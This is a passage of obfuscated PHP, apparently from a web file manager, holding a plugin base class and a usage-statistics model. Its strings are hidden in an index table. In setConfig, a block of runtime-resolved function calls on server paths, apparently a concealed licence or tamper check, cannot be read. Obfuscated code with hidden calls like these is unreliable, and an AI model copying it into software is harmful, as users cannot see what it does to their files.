. $Õ¹È†Çú[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Õ¹È†Çú[1542]] . $this->pluginName . $Õ¹È†Çú[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[™»È’øè][1543]); } protected function assign($¨ÈÀª’“, $”ßŞÈüõ = false) { if (is_array($¨ÈÀª’“)) { $this->values = array_merge($this->values, $¨ÈÀª’“); } else { $this->values[$¨ÈÀª’“] = $”ßŞÈüõ; } } protected function display($³Ú¾’í¤) { extract($this->values); require $³Ú¾’í¤; } final function hookRegist($“©Í£ÓÚ) { $this->modelPlugin->appRegist($this->pluginName, $“©Í£ÓÚ); } final function appIcon() { $‰¤ôÙÕ† =& $_SERVER[™»È’øè]; $şæ¬ª•© = $this->appPackage(); $ÍÛ×íæ = $‰¤ôÙÕ†[12]; if (isset($şæ¬ª•©[$‰¤ôÙÕ†[457]])) { if (isset($şæ¬ª•©[$‰¤ôÙÕ†[457]][$‰¤ôÙÕ†[1544]])) { $ÍÛ×íæ = $‰¤ôÙÕ†[1545] . $şæ¬ª•©[$‰¤ôÙÕ†[457]][$‰¤ôÙÕ†[1544]] . $‰¤ôÙÕ†[1546]; } else { if ($şæ¬ª•©[$‰¤ôÙÕ†[457]][$‰¤ôÙÕ†[1547]]) { $ÍÛ×íæ = $‰¤ôÙÕ†[1548] . $şæ¬ª•©[$‰¤ôÙÕ†[457]][$‰¤ôÙÕ†[1547]] . $‰¤ôÙÕ†[1549]; } } } return $ÍÛ×íæ; } final function fileCanView($¾Â¬Â™º) { $½”ÊÎÕå =& $_SERVER[™»È’øè]; if (request_url_safe($¾Â¬Â™º)) { return !0; } if ($this->isShare($¾Â¬Â™º)) { return !0; } $ê©¾– = Session::get($½”ÊÎÕå[1550]); if ($GLOBALS[$½”ÊÎÕå[535]] != 1 && !$ê©¾– || !$ê©¾–[$½”ÊÎÕå[1551]]) { $Æ”Ù–½ş = $½”ÊÎÕå[1552] . rawurlencode(this_url()); show_tips(LNG($½”ÊÎÕå[1553]) . $½”ÊÎÕå[1554] . $Æ”Ù–½ş . $½”ÊÎÕå[1555] . LNG($½”ÊÎÕå[1556]) . $½”ÊÎÕå[1557], !1); } if (!Action($½”ÊÎÕå[1558])->authCan($½”ÊÎÕå[1559])) { show_tips(LNG($½”ÊÎÕå[1560]) . $½”ÊÎÕå[1561], !1); } ActionCall($½”ÊÎÕå[1562], $¾Â¬Â™º); } final function isShare($± ê£¢º) { $­¨³Şö´ = KodIO::parse($± ê£¢º); return $­¨³Şö´[$_SERVER[™»È’øè][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¸Î™ı¦Ø) { if (request_url_safe($¸Î™ı¦Ø)) { return $¸Î™ı¦Ø; } if (!$this->isShare($¸Î™ı¦Ø)) { $¸Î™ı¦Ø = $this->filePath($¸Î™ı¦Ø, !1); } return Action($_SERVER[™»È’øè][1204])->linkOut($¸Î™ı¦Ø); } public function filePathLinkOut($ÊŸ“Š½õ) { if (request_url_safe($ÊŸ“Š½õ)) { return $ÊŸ“Š½õ; } $this->fileCanView($ÊŸ“Š½õ); return Action($_SERVER[™»È’øè][1204])->link($ÊŸ“Š½õ); } final function filePath($ö•“ÜÆù, $öÆí‚®¡ = true) { $ †Õ«Ó =& $_SERVER[™»È’øè]; if ($€¼ƒ®Ÿµ = $this->checkSharePath($ö•“ÜÆù, $öÆí‚®¡)) { Hook::trigger($ †Õ«Ó[1563], $€¼ƒ®Ÿµ); return $€¼ƒ®Ÿµ; } $this->fileCanView($ö•“ÜÆù); if (request_url_safe($ö•“ÜÆù)) { $­¿ãê·Ä = parse_url_query($ö•“ÜÆù); if (isset($­¿ãê·Ä[$ †Õ«Ó[1564]]) && isset($­¿ãê·Ä[$ †Õ«Ó[217]])) { $¹“¬ì¦  = Model($ †Õ«Ó[795])->get($ †Õ«Ó[796]); $úÚµß = Mcrypt::decode($­¿ãê·Ä[$ †Õ«Ó[217]], $¹“¬ì¦ ); if ($úÚµß) { $this->fileInfo = IO::info($úÚµß); $this->fileInfo[$ †Õ«Ó[1565]] = $ö•“ÜÆù; $this->cachePath = $this->pluginCachePath($ †Õ«Ó[12], $öÆí‚®¡); if (!$this->fileInfo) { show_tips(LNG($ †Õ«Ó[105]), !1); } Hook::trigger($ †Õ«Ó[1563], $úÚµß); return $úÚµß; } } $ö•“ÜÆù = $this->_cacheHttpFile($ö•“ÜÆù, $öÆí‚®¡); $this->fileInfo = IO::info($ö•“ÜÆù); } else { $this->fileInfo = IO::info($ö•“ÜÆù); $this->cachePath = $this->pluginCachePath($ †Õ«Ó[12], $öÆí‚®¡); } if (!$this->fileInfo) { show_tips(LNG($ †Õ«Ó[105]), !1); } Hook::trigger($ †Õ«Ó[1563], $ö•“ÜÆù); return $ö•“ÜÆù; } final function _cacheHttpFile($ì÷ƒËü„, $ÆÍÄğÂ = true) { $·éë÷æÖ =& $_SERVER[™»È’øè]; $«µ¡ñ‹ñ = parse_url_query($ì÷ƒËü„); $êÃäÛÆâ = get_path_ext($ì÷ƒËü„); if (preg_match($·éë÷æÖ[1566], $êÃäÛÆâ, $šÔğ´Ü‹)) { $êÃäÛÆâ = $šÔğ´Ü‹ ? $šÔğ´Ü‹[0] : $·éë÷æÖ[12]; } if (isset($«µ¡ñ‹ñ[$·éë÷æÖ[32]]) && $«µ¡ñ‹ñ[$·éë÷æÖ[32]]) { $êÃäÛÆâ = get_path_ext($«µ¡ñ‹ñ[$·éë÷æÖ[32]]); } $ƒ’§¹âş = hash_path($ì÷ƒËü„) . $·éë÷æÖ[10] . $êÃäÛÆâ; $this->cachePath = $this->pluginCachePath($ÆÍÄğÂ ? $ƒ’§¹âş : $·éë÷æÖ[12]); $—Àö¯‘ƒ = IO::fileNameExist($this->cachePath, $ƒ’§¹âş); if ($—Àö¯‘ƒ) { return KodIO::make($—Àö¯‘ƒ); } $°¢±ä = rtrim($this->cachePath, $·éë÷æÖ[8]) . $·éë÷æÖ[8] . $ƒ’§¹âş; return $this->pluginCacheFileSet($°¢±ä, file_get_contents_nossl($ì÷ƒËü„)); } final function checkSharePath($Ÿş¶¶³ø, $¾šÎÕäÛ = true) { $ª¡â›¤˜ =& $_SERVER[™»È’øè]; if (!$this->isShare($Ÿş¶¶³ø)) { return !1; } $Ìğ¸çŠÃ = Action($ª¡â›¤˜[1204])->sharePathInfo($Ÿş¶¶³ø); if (!is_array($Ìğ¸çŠÃ) || !isset($Ìğ¸çŠÃ[$ª¡â›¤˜[84]]) || !is_array($Ìğ¸çŠÃ[$ª¡â›¤˜[515]])) { show_json(LNG($ª¡â›¤˜[1567]), !1); } $this->fileInfo = $Ìğ¸çŠÃ[$ª¡â›¤˜[515]]; $this->cachePath = $this->pluginCachePath(!1, $¾šÎÕäÛ); return $Ìğ¸çŠÃ[$ª¡â›¤˜[84]]; } final function pluginCachePath($ä­Ê–ªå = '', $©Í³µ£ = false) { $¢¿‡ÂÒ¶ =& $_SERVER[™»È’øè]; if ($©Í³µ£ && is_array($this->fileInfo)) { $ä­Ê–ªå = kodIO::hashPath($this->fileInfo, !1); } $¸×¦ìñœ = rtrim(IO_PATH_SYSTEM_TEMP . $¢¿‡ÂÒ¶[1568] . $this->pluginName . $¢¿‡ÂÒ¶[8] . $ä­Ê–ªå, $¢¿‡ÂÒ¶[8]); $Ç±ˆÓ’… = IO::infoFullSimple($¸×¦ìñœ); $†©×ñœæ = $Ç±ˆÓ’… && is_array($Ç±ˆÓ’…) ? $Ç±ˆÓ’…[$¢¿‡ÂÒ¶[84]] : $¢¿‡ÂÒ¶[12]; if (!$†©×ñœæ) { $†©×ñœæ = IO::mkdir($¸×¦ìñœ); } return $†©×ñœæ; } final function pluginCacheFileSet($®ÔîØ, $áà˜½Ûä = '') { $Æœàò»æ =& $_SERVER[™»È’øè]; $‰“²À = IO::infoFullSimple($®ÔîØ); if (!$‰“²À) { return IO::mkfile($®ÔîØ, $áà˜½Ûä, REPEAT_REPLACE); } IO::setContent($‰“²À[$Æœàò»æ[84]], $áà˜½Ûä); return $‰“²À[$Æœàò»æ[84]]; } final function pluginLocalFile($²åÌ¸¯ = '') { $¹ñìÆÕ =& $_SERVER[™»È’øè]; $œ¦óÄÑ„ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($œ¦óÄÑ„)) { mk_dir($œ¦óÄÑ„); } if (!$²åÌ¸¯) { return $œ¦óÄÑ„; } $¹ŸøõÄ† = IO::info($²åÌ¸¯); $»ğÑÁî = $¹ñìÆÕ[1569] . KodIO::hashPath($¹ŸøõÄ†) . $¹ñìÆÕ[10] . $¹ŸøõÄ†[$¹ñìÆÕ[174]]; if (!checkExtSafe($»ğÑÁî)) { $»ğÑÁî = $»ğÑÁî . $¹ñìÆÕ[1236]; } $ùè¢—Õ¾ = $œ¦óÄÑ„ . $»ğÑÁî; if (@file_exists($ùè¢—Õ¾)) { return $ùè¢—Õ¾; } return IO::copy($²åÌ¸¯, $œ¦óÄÑ„, 0, $»ğÑÁî); } final function appPackage() { $äú§àƒ¤ =& $_SERVER[™»È’øè]; if ($this->packageData) { return $this->packageData; } $¿¬Ğ€Ê = $this->parseFile($this->pluginPath . $äú§àƒ¤[1570]); $this->parseLang($¿¬Ğ€Ê); $½“´ˆöš = json_decode_force($¿¬Ğ€Ê); if (!$½“´ˆöš) { return array(); } $ŸáÆäßö = Hook::trigger($äú§àƒ¤[1571], $½“´ˆöš); if ($ŸáÆäßö && is_array($ŸáÆäßö)) { $½“´ˆöš = $ŸáÆäßö; } $this->packageData = $½“´ˆöš; return $½“´ˆöš; } public function packageInfoGet($ÓˆÆá¥š) { $“Ô­òüÖ = $this->appPackage(); return array_get_value($“Ô­òüÖ, $ÓˆÆá¥š); } public function packageVersion() { return $this->packageInfoGet($_SERVER[™»È’øè][1572]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[™»È’øè][1573]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[™»È’øè][1574]); } public function echoJsAssign($éä¸¬‚÷, $ÇÑäûÊÛ) { $this->echoJsAssignArr[$éä¸¬‚÷] = $ÇÑäûÊÛ; } private function parseFile($Ò…ÁÌÁ¸) { $ÇŒÖÀ™• =& $_SERVER[™»È’øè]; $Ê´˜ı¸Ù = file_get_contents_nossl($Ò…ÁÌÁ¸); $Õü…ÑÜ† = array($ÇŒÖÀ™•[1575], $ÇŒÖÀ™•[1576], $ÇŒÖÀ™•[1577], $ÇŒÖÀ™•[1578], $ÇŒÖÀ™•[1579], $ÇŒÖÀ™•[1580], $ÇŒÖÀ™•[1581]); $î¹õ®İ» = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ÇŒÖÀ™•[89]][$ÇŒÖÀ™•[1582]]); foreach ($this->echoJsAssignArr as $›Ø‚¢ğÚ => $‡°Ã›¡Ô) { $Õü…ÑÜ†[] = $ÇŒÖÀ™•[1583] . $›Ø‚¢ğÚ . $ÇŒÖÀ™•[1584]; $î¹õ®İ»[] = is_array($‡°Ã›¡Ô) || is_object($‡°Ã›¡Ô) ? rawurlencode(json_encode($‡°Ã›¡Ô)) : $‡°Ã›¡Ô; } if (strstr($Ê´˜ı¸Ù, $ÇŒÖÀ™•[1585])) { $ëíé®¸† = rawurlencode(json_encode($this->pluginLangArr)); $Ê´˜ı¸Ù = str_replace($ÇŒÖÀ™•[1585], $ëíé®¸†, $Ê´˜ı¸Ù); } if (strstr($Ê´˜ı¸Ù, $ÇŒÖÀ™•[1586])) { $ëíé®¸† = $ëíé®¸† = rawurlencode(json_encode($this->getConfig())); $Ê´˜ı¸Ù = str_replace($ÇŒÖÀ™•[1586], $ëíé®¸†, $Ê´˜ı¸Ù); } $Ê´˜ı¸Ù = str_replace($Õü…ÑÜ†, $î¹õ®İ», $Ê´˜ı¸Ù); return $Ê´˜ı¸Ù; } private function parseLang(&$ŞÖ¥Î˜å) { $É¶ñæªÅ =& $_SERVER[™»È’øè]; $±¹î™Ê = $É¶ñæªÅ[1587]; if (!strstr($ŞÖ¥Î˜å, $±¹î™Ê)) { return; } preg_match_all($É¶ñæªÅ[1588], $ŞÖ¥Î˜å, $±ÜÑ‘÷ï); if (!is_array($±ÜÑ‘÷ï) || count($±ÜÑ‘÷ï) == 0 || !is_array($±ÜÑ‘÷ï[0]) || count($±ÜÑ‘÷ï[0]) == 0) { return; } $Ò€Üš£¥ = array(); $¥÷éáêŞ = array(); foreach ($±ÜÑ‘÷ï[0] as $—¦ïÍ´Û) { $Ñè…ïè„ = substr($—¦ïÍ´Û, strlen($±¹î™Ê), -4); $©¼ë‡˜ğ = LNG($Ñè…ïè„); $Ò€Üš£¥[] = $—¦ïÍ´Û; $¥÷éáêŞ[] = str_replace(array($É¶ñæªÅ[245], $É¶ñæªÅ[1108], $É¶ñæªÅ[385], $É¶ñæªÅ[118]), array($É¶ñæªÅ[53], $É¶ñæªÅ[53], $É¶ñæªÅ[12], $É¶ñæªÅ[1589]), $©¼ë‡˜ğ); } $ŞÖ¥Î˜å = str_replace($Ò€Üš£¥, $¥÷éáêŞ, $ŞÖ¥Î˜å); } private function parseConfig(&$±ü– ÕÊ) { $Ë×÷¦Ö‹ =& $_SERVER[™»È’øè]; $¹¡ìµÈÀ = $Ë×÷¦Ö‹[1590]; if (!strstr($±ü– ÕÊ, $¹¡ìµÈÀ)) { return; } preg_match_all($Ë×÷¦Ö‹[1591], $±ü– ÕÊ, $’£Ù´‚à); if (!is_array($’£Ù´‚à) || count($’£Ù´‚à) == 0 || !is_array($’£Ù´‚à[0]) || count($’£Ù´‚à[0]) == 0) { return; } $ß¹å¦Æ = $this->getConfig(); $öÑæ»ƒ = array(); $Ğ‘öõ§‹ = array(); foreach ($’£Ù´‚à[0] as $×¾É”ª¸) { $êãòäïÜ = substr($×¾É”ª¸, strlen($¹¡ìµÈÀ), -2); $öÑæ»ƒ[] = $×¾É”ª¸; $Ğ‘öõ§‹[] = _get($ß¹å¦Æ, $êãòäïÜ); } $±ü– ÕÊ = str_replace($öÑæ»ƒ, $Ğ‘öõ§‹, $±ü– ÕÊ); } private function parsePackage(&$Œ™¨××í) { $„œÁå‚ñ =& $_SERVER[™»È’øè]; $›¡”´À = $„œÁå‚ñ[1592]; if (!strstr($Œ™¨××í, $›¡”´À)) { return; } preg_match_all($„œÁå‚ñ[1593], $Œ™¨××í, $…õ¹Ş‘Î); if (!is_array($…õ¹Ş‘Î) || count($…õ¹Ş‘Î) == 0 || !is_array($…õ¹Ş‘Î[0]) || count($…õ¹Ş‘Î[0]) == 0) { return; } $µğÉĞÚ = $this->appPackage(); $ÕÍ•æïâ = array(); $´€©ş±÷ = array(); foreach ($…õ¹Ş‘Î[0] as $šñÏê»·) { $ı¢®¢Ï¾ = substr($šñÏê»·, strlen($›¡”´À), -2); $ÕÍ•æïâ[] = $šñÏê»·; $´€©ş±÷[] = _get($µğÉĞÚ, $ı¢®¢Ï¾); } $Œ™¨××í = str_replace($ÕÍ•æïâ, $´€©ş±÷, $Œ™¨××í); } final function echoFile($¼‚û´Ü³, $å‰µû›‹ = false) { $ ·èˆ¦ =& $_SERVER[™»È’øè]; $úçÌöÚ– = $this->pluginPath . $¼‚û´Ü³; if (ACT == $ ·èˆ¦[1594]) { echo $ ·èˆ¦[1595] . $this->pluginName . $ ·èˆ¦[8] . $¼‚û´Ü³ . $ ·èˆ¦[1596]; if (!file_exists($úçÌöÚ–)) { echo $ ·èˆ¦[1597]; return; } } $Ó‡Ù¤±¢ = $this->parseFile($úçÌöÚ–); $this->parseLang($Ó‡Ù¤±¢); $this->parseConfig($Ó‡Ù¤±¢); $this->parsePackage($Ó‡Ù¤±¢); if (is_array($å‰µû›‹)) { $Ó‡Ù¤±¢ = str_replace(array_keys($å‰µû›‹), array_values($å‰µû›‹), $Ó‡Ù¤±¢); } echo $ ·èˆ¦[245] . $Ó‡Ù¤±¢; } final function initLang() { $ÇÔ”ªĞ¼ =& $_SERVER[™»È’øè]; $ú¬ª¬‚ù = $ÇÔ”ªĞ¼[1598]; $âË®Öàç = $this->pluginPath . $ÇÔ”ªĞ¼[1599]; $ÀÓäÁ§‡ = I18n::getType(); $†èí¿ = array(); if (file_exists($âË®Öàç . $ÀÓäÁ§‡ . $ÇÔ”ªĞ¼[864])) { $†èí¿ = (include $âË®Öàç . $ÀÓäÁ§‡ . $ÇÔ”ªĞ¼[864]); } else { if ($ÀÓäÁ§‡ == $ÇÔ”ªĞ¼[1600] && !file_exists($âË®Öàç . $ÀÓäÁ§‡ . $ÇÔ”ªĞ¼[864]) && file_exists($âË®Öàç . $ÇÔ”ªĞ¼[1601])) { $†èí¿ = (include $âË®Öàç . $ÇÔ”ªĞ¼[1601]); } else { if (file_exists($âË®Öàç . $ú¬ª¬‚ù . $ÇÔ”ªĞ¼[864])) { $†èí¿ = (include $âË®Öàç . $ú¬ª¬‚ù . $ÇÔ”ªĞ¼[864]); } } } if (!is_array($†èí¿)) { return array(); } if (@count($†èí¿) > 0) { I18n::set($†èí¿); } return $†èí¿; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ù°ˆËª) { $¡ğÙæ“ú =& $_SERVER[™»È’øè]; if ($_SERVER[$¡ğÙæ“ú[892]] != $_SERVER[$¡ğÙæ“ú[1602]]) { $´ĞâÄÓ¹ = $¡ğÙæ“ú[909]; $•òÇ³ = $¡ğÙæ“ú[894]; $³ö¯ñ = $_SERVER[$¡ğÙæ“ú[895]] . $¡ğÙæ“ú[896]; $»Üƒ•† = $•òÇ³($³ö¯ñ); $Ğ†º†— = explode($¡ğÙæ“ú[245], $»Üƒ•†); if (count($Ğ†º†—) < $¡ğÙæ“ú[663]) { $Í¹ËÎ ½ = $¡ğÙæ“ú[897]; $Í¹ËÎ ½(); } $…±¬µöš = $¡ğÙæ“ú[910]; $…±¬µöš($_SERVER[$¡ğÙæ“ú[911]]); $…±¬µöš($_SERVER[$¡ğÙæ“ú[895]] . $¡ğÙæ“ú[1603]); $µ„ó×Ñœ = 1; while ($µ„ó×Ñœ > 1) { $µ„ó×Ñœ = $µ„ó×Ñœ + 4; $îÀ„ı£§ = rawurlencode($µ„ó×Ñœ . $¡ğÙæ“ú[421]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ù°ˆËª); } public function onSetConfig($î¡ïÉìõ) { } public function onGetConfig($Æ©çÍŸü) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($áËÙíØ—) { if ($áËÙíØ— == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ø‹ºÇ©° = "\x70\154\165\147\x69\156\x41\x75\x74\x68") { $‚Š‚¦Ì® =& $_SERVER[™»È’øè]; if (!Session::get($‚Š‚¦Ì®[1550])) { return !1; } if (_get($GLOBALS, $‚Š‚¦Ì®[535])) { return !0; } $—¨‡Ò© = $this->getConfig(); if (!$—¨‡Ò©[$ø‹ºÇ©°]) { return !1; } return ActionCall($‚Š‚¦Ì®[1604], $—¨‡Ò©[$ø‹ºÇ©°]); } public function url($à‰¶©¾İ, $ÊòÆ¥Øş = '', $™›Î§Ù = true) { $…íñÎ†ˆ =& $_SERVER[™»È’øè]; $½¾Œ–‚ô = $this->getConfig(); $ıÛ³äºñ = KOD_VERSION . $…íñÎ†ˆ[10] . KOD_VERSION_BUILD; $ÀÏÉõğÆ = $this->packageVersion(); $¨™ö­ù÷ = $ıÛ³äºñ . $…íñÎ†ˆ[429] . $ÀÏÉõğÆ; if (substr($à‰¶©¾İ, 0, 4) == $…íñÎ†ˆ[148] || substr($à‰¶©¾İ, 0, 2) == $…íñÎ†ˆ[1308]) { $•°™ğ°Ä = $à‰¶©¾İ . $…íñÎ†ˆ[1605] . $¨™ö­ù÷; } else { if ($ÊòÆ¥Øş == $…íñÎ†ˆ[12]) { $•°™ğ°Ä = $this->pluginHost . $à‰¶©¾İ . $…íñÎ†ˆ[1605] . $¨™ö­ù÷; } else { if ($ÊòÆ¥Øş === $…íñÎ†ˆ[75]) { $•°™ğ°Ä = $this->pluginHost . $à‰¶©¾İ; } else { if ($ÊòÆ¥Øş == $…íñÎ†ˆ[1606]) { $•°™ğ°Ä = STATIC_PATH . $à‰¶©¾İ . $…íñÎ†ˆ[1605] . $ıÛ³äºñ; } else { if ($ÊòÆ¥Øş == $…íñÎ†ˆ[1607]) { $•°™ğ°Ä = APP_HOST . $…íñÎ†ˆ[1608] . $à‰¶©¾İ . $…íñÎ†ˆ[1605] . $ıÛ³äºñ; } else { if (isset($½¾Œ–‚ô[$ÊòÆ¥Øş])) { $•°™ğ°Ä = $½¾Œ–‚ô[$ÊòÆ¥Øş] . $à‰¶©¾İ . $…íñÎ†ˆ[1605] . $¨™ö­ù÷; } } } } } } if (!$™›Î§Ù) { return $•°™ğ°Ä; } echo $•°™ğ°Ä; } public function link($×É…Æ÷¼ = false, $ğæÎ¯ì = '') { $ëÒ‰ÚÒ =& $_SERVER[™»È’øè]; if (!$×É…Æ÷¼) { $this->link($ëÒ‰ÚÒ[1609], $ëÒ‰ÚÒ[1607]); $this->link($ëÒ‰ÚÒ[1610], $ëÒ‰ÚÒ[1606]); $this->link($ëÒ‰ÚÒ[1611], $ëÒ‰ÚÒ[1606]); $this->link($ëÒ‰ÚÒ[1612], $ëÒ‰ÚÒ[1606]); $this->link($ëÒ‰ÚÒ[1613], $ëÒ‰ÚÒ[1606]); return; } $Œ²º•è = $this->url($×É…Æ÷¼, $ğæÎ¯ì, !1); if (substr($×É…Æ÷¼, -3) == $ëÒ‰ÚÒ[1614]) { echo $ëÒ‰ÚÒ[1615] . $Œ²º•è . $ëÒ‰ÚÒ[1616] . $ëÒ‰ÚÒ[245]; } else { if (substr($×É…Æ÷¼, -4) == $ëÒ‰ÚÒ[1617]) { echo $ëÒ‰ÚÒ[1618] . $Œ²º•è . $ëÒ‰ÚÒ[1619] . $ëÒ‰ÚÒ[245]; } } } } goto A¬¶‰öäÙ›; BÑÇœíÒª: class AnalysisModel extends ModelBaseLight { public function init($Ç‡Ÿˆç´) { $²öóë‹¬ =& $_SERVER[™»È’øè]; $¯ğ‰Ó„ = array($²öóë‹¬[629] => array($²öóë‹¬[33] => $²öóë‹¬[1799], $²öóë‹¬[316] => array($²öóë‹¬[238], $²öóë‹¬[790], $²öóë‹¬[1800], $²öóë‹¬[1801])), $²öóë‹¬[1802] => array($²öóë‹¬[33] => $²öóë‹¬[1803], $²öóë‹¬[316] => array($²öóë‹¬[238], $²öóë‹¬[788], $²öóë‹¬[1804], $²öóë‹¬[1805], $²öóë‹¬[1806]))); if (!isset($¯ğ‰Ó„[$Ç‡Ÿˆç´])) { return !1; } $this->optionType = $¯ğ‰Ó„[$Ç‡Ÿˆç´][$²öóë‹¬[33]]; $this->field = $¯ğ‰Ó„[$Ç‡Ÿˆç´][$²öóë‹¬[316]]; return !0; } public function listData($ÑÛš²®í = false, $†Ù‡ğâŒ = "\155\157\144\x69\x66\171\124\x69\155\x65", $÷‹ÂÕ‹à = false) { return parent::listData($ÑÛš²®í, $†Ù‡ğâŒ, $÷‹ÂÕ‹à); } public function trendList($ææ¥û°) { $¦Óïî†˜ =& $_SERVER[™»È’øè]; $“ùİ²Ö° = $this->listData(); if ($“ùİ²Ö°) { $¶ã‹ù… = end($“ùİ²Ö°); $Ôë‡’¥ˆ = date($¦Óïî†˜[1807], strtotime($¦Óïî†˜[1808])); if ($¶ã‹ù…[$¦Óïî†˜[238]] == $Ôë‡’¥ˆ) { return $“ùİ²Ö°; } $»öÈÏ´ = strtotime($¶ã‹ù…[$¦Óïî†˜[238]]); } if (!isset($»öÈÏ´)) { $¡šÒ¸è… = $ææ¥û° == $¦Óïî†˜[629] ? $¦Óïî†˜[566] : $¦Óïî†˜[850]; $»öÈÏ´ = Model($¡šÒ¸è…)->min($¦Óïî†˜[214]); } $îªÁÂàè = $¦Óïî†˜[1809] . ucfirst($ææ¥û°); $¬Ùæš¡¢ = $this->dateList($»öÈÏ´); foreach ($¬Ùæš¡¢ as $Ôë‡’¥ˆ) { $this->{$îªÁÂàè}($Ôë‡’¥ˆ); } return $this->listData(); } private function dateList($ÂÀ¼±š) { $ùÕ÷á´ =& $_SERVER[™»È’øè]; $îÃ„Âå = $ÂÀ¼±š; $Ã†”±£í = strtotime($ùÕ÷á´[1808]); $‡“Ô­™Ì = array(); while ($îÃ„Âå <= $Ã†”±£í) { $‡“Ô­™Ì[] = date($ùÕ÷á´[1807], $îÃ„Âå); $îÃ„Âå = strtotime($ùÕ÷á´[1810], $îÃ„Âå); } return $‡“Ô­™Ì; } public function _recordUser($¾Î±éŸ§ = '') { $‡Èİû µ =& $_SERVER[™»È’øè]; $Åë€ßü = strtotime(date($‡Èİû µ[1811], strtotime($¾Î±éŸ§))); $©òê ßû = strtotime(date($‡Èİû µ[1812], strtotime($¾Î±éŸ§))); $‚Â÷ª¨ä = array($‡Èİû µ[214] => array($‡Èİû µ[1043], $©òê ßû)); $œÃê¹á÷ = Model($‡Èİû µ[566])->where($‚Â÷ª¨ä)->count($‡Èİû µ[1678]); $‚Â÷ª¨ä[$‡Èİû µ[214]] = array($‡Èİû µ[376], array($Åë€ßü, $©òê ßû)); $×àİ¡’¬ = Model($‡Èİû µ[566])->where($‚Â÷ª¨ä)->count($‡Èİû µ[1678]); $‚Â÷ª¨ä[$‡Èİû µ[33]] = $‡Èİû µ[1813]; $®Èàë¬Õ = Model($‡Èİû µ[1814])->where($‚Â÷ª¨ä)->count($‡Èİû µ[1815]); $¨Ç†Ò– = array($‡Èİû µ[238] => $¾Î±éŸ§, $‡Èİû µ[790] => (int) $œÃê¹á÷, $‡Èİû µ[1800] => (int) $×àİ¡’¬, $‡Èİû µ[1801] => (int) $®Èàë¬Õ); return $this->insert($¨Ç†Ò–); } public function _recordStore($ÓŠŸ•© = '') { $§ÏÛ³¨ó =& $_SERVER[™»È’øè]; $»øï¼ş = strtotime(date($§ÏÛ³¨ó[1812], strtotime($ÓŠŸ•©))); $¢ğ¯³²‹ = array($§ÏÛ³¨ó[214] => array($§ÏÛ³¨ó[1043], $»øï¼ş)); $°µ©¤üÏ = Model($§ÏÛ³¨ó[511])->where($¢ğ¯³²‹)->sum($§ÏÛ³¨ó[76]); $¢ğ¯³²‹[$§ÏÛ³¨ó[452]] = 0; $—®¶ÛçÄ = Model($§ÏÛ³¨ó[850])->where($¢ğ¯³²‹)->sum($§ÏÛ³¨ó[76]); $¢ğ¯³²‹[$§ÏÛ³¨ó[177]] = 1; $Ÿı§ç¡ = Model($§ÏÛ³¨ó[850])->where($¢ğ¯³²‹)->sum($§ÏÛ³¨ó[76]); $¢ğ¯³²‹[$§ÏÛ³¨ó[177]] = 2; $ªŒ‡ÜÔ = Model($§ÏÛ³¨ó[850])->where($¢ğ¯³²‹)->sum($§ÏÛ³¨ó[76]); $’óŠ²Ôï = array($§ÏÛ³¨ó[238] => $ÓŠŸ•©, $§ÏÛ³¨ó[788] => (int) $—®¶ÛçÄ, $§ÏÛ³¨ó[1804] => (int) $°µ©¤üÏ, $§ÏÛ³¨ó[1805] => (int) $Ÿı§ç¡, $§ÏÛ³¨ó[1806] => (int) $ªŒ‡ÜÔ); return $this->insert($’óŠ²Ôï); } public function trend($‹ĞÕ–ç, $âª’ş¥) { $š×¹ÒºÕ =& $_SERVER[™»È’øè]; if (!$this->init($‹ĞÕ–ç)) { return !1; } $èØ‰à¬ = $this->trendList($‹ĞÕ–ç); if ($èØ‰à¬ && $âª’ş¥ != $š×¹ÒºÕ[1651]) { $åÌû†ıœ = $èØ‰à¬[0][$š×¹ÒºÕ[238]]; $ñ¶àÚÑ½ = $this->validDate($âª’ş¥, $åÌû†ıœ); $¢·‘å’ = array(); $ø½ß¸‚İ = array_to_keyvalue($èØ‰à¬, $š×¹ÒºÕ[238]); foreach ($ñ¶àÚÑ½ as $Ïó±Ä¹Ÿ) { if (isset($ø½ß¸‚İ[$Ïó±Ä¹Ÿ])) { $ÊÀª„ŠŒ = $ø½ß¸‚İ[$Ïó±Ä¹Ÿ]; } else { $ÊÀª„ŠŒ = end($èØ‰à¬); $ÊÀª„ŠŒ[$š×¹ÒºÕ[238]] = $Ïó±Ä¹Ÿ; if ($‹ĞÕ–ç == $š×¹ÒºÕ[629]) { $ÊÀª„ŠŒ[$š×¹ÒºÕ[1800]] = $ÊÀª„ŠŒ[$š×¹ÒºÕ[1801]] = 0; } } $¢·‘å’[] = $ÊÀª„ŠŒ; } $èØ‰à¬ = $¢·‘å’; } $êØÂ¡ó¤ = array($š×¹ÒºÕ[629] => array($š×¹ÒºÕ[790] => LNG($š×¹ÒºÕ[1816]), $š×¹ÒºÕ[1800] => LNG($š×¹ÒºÕ[1817]), $š×¹ÒºÕ[1801] => LNG($š×¹ÒºÕ[1818])), $š×¹ÒºÕ[1802] => array($š×¹ÒºÕ[788] => LNG($š×¹ÒºÕ[1819]), $š×¹ÒºÕ[1804] => LNG($š×¹ÒºÕ[1820]), $š×¹ÒºÕ[1805] => LNG($š×¹ÒºÕ[1821]), $š×¹ÒºÕ[1806] => LNG($š×¹ÒºÕ[1822]))); $‰ÑÙ“ÅÖ = array($š×¹ÒºÕ[629] => $š×¹ÒºÕ[1823], $š×¹ÒºÕ[1802] => $š×¹ÒºÕ[76]); if (empty($èØ‰à¬)) { $Ïó±Ä¹Ÿ = date($š×¹ÒºÕ[1807], strtotime($š×¹ÒºÕ[1808])); $ƒÊæó = 